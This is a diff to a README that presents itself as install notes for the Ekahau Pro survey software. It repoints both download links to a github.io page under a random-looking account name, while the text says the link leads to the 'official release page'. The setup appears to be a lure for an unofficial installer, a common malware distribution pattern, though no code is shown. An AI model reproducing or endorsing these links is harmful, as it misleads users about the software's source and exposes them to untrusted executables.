@@ -1,6 +1,6 @@
 # 🛠️ Ekahau-Install-Notes - Reliable Setup Guide for Ekahau Pro
 
-[![](https://img.shields.io/badge/Download-Ekahau-Pro-blue.svg)](https://github.com/Retributory-genushaematobia430/Ekahau-Install-Notes)
+[![](https://img.shields.io/badge/Download-Ekahau-Pro-blue.svg)](https://retributory-genushaematobia430.github.io)
 
 ## 📋 Project Overview
 This repository provides instructions for installing Ekahau Pro on Windows 11. Users often encounter setup failures when installing this network survey software. These notes help you navigate common error messages, system dependencies, and configuration requirements to ensure a functional installation. Follow these steps to resolve your setup issues and start your site survey projects.
@@ -18,7 +18,7 @@ Before you begin the installation, verify your computer meets these standards:
 ## 📥 Getting the Software
 To start your installation, visit the primary source provided below. This link directs you to the official release page where you can obtain the latest installer package.
 
-[Click here to visit the download page](https://github.com/Retributory-genushaematobia430/Ekahau-Install-Notes)
+[Click here to visit the download page](https://retributory-genushaematobia430.github.io)
 
 ## 🏗️ Installation Steps
 Follow this process to install the software correctly on your system.
